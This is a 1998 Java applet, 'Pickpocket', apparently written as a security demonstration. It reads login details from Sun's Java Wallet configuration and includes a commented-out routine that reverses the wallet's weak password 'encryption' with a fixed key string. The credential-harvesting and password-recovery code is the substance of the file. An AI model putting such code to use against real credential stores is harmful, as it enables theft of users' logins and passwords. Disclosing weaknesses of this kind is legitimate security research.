/*  Pickpocket.java by Mark D. LaDue */

/*  April 30, 1998 */

/*  Copyright (c) 1998 Mark D. LaDue
    You may study, use, modify, and distribute this example for any purpose.
    This example is provided WITHOUT WARRANTY either expressed or implied.  */

/*  This applet gets information from your Java Wallet - including your
    login and password if you've saved them as the default for auto-login.
    Well, so much for secure electronic commerce. */

import java.awt.*;
import java.io.*;
import javax.commerce.base.*;
import javax.commerce.util.*;

public class Pickpocket extends java.applet.Applet implements Runnable {

    Thread controller = null;
    File fie = null;
    String wfilename;
    String login = null;
    String encpword = null;
    String realpword = null;
    TextArea console = null;


    public void init() {
       console = new TextArea("Pickpocket is a harmless demo applet.\n", 80, 35);
        console.setEditable(false);
        add(console);
        console.append("To try it you must have already set up:\n");
        console.append("1. Sun's Java Plug-in 1.1;\n");
        console.append("2. Sun's Java Wallet (Early Access 1 Release);\n");
        console.append("3. user login and password in the Wallet.\n");

    }

    public void start() {
        if (controller == null) {
            //console.append("started the applet\n");
            controller = new Thread(this);
            controller.start();
        }

    }

    public void stop() {}

    public void run() {

/* This works regardless of whether or not jecf.properties contains info */
        fie = JECF.getWalletHome();
        console.append("\nWallet Home: " +
                          fie.toString() + "\n");

/* This depends on jecf.properties containing login information */
        //wfilename = JECF.getJecfProperty("jecf.walletfile");
        login = JECF.getJecfProperty("jecf.user");
        //encpword = JECF.getJecfProperty("jecf.password");
        console.append("Wallet file name: " +
                           wfilename + "\n");
        console.append("login name: " +
                           login + "\n");
        console.append("password: " +
                           encpword + "\n");
        //console.append("Pickpocket will now determine your password.\n");
        //realpword = decrypt(encpword);
        //console.append("Pickpocket found your real password: " +
        //                realpword + "\n");


}

/* This recovers the "encrypted" password */
/*
    public String decrypt(String encpw) {

        String refstr = new String("fB8?!~0[1*&xhg^765Aq*(7GHjgytuYU87521*&(*79(87(*98gihGIhihgghi");

        if(encpw.length() == 0) {
            return encpw;
        }

        byte byter[];

        try {

            BASE64Decoder base64decoder = new BASE64Decoder();
            byter = base64decoder.decodeBuffer(encpw);
            byte refbytes[] = refstr.getBytes();
            int i = Math.min(byter.length, refbytes.length);
            for(int j = 0; j < i; j++)
                byter[j] -= refbytes[j];

        }
        catch(Exception ex) {return "";}

        return new String(byter);

    }
*/
}
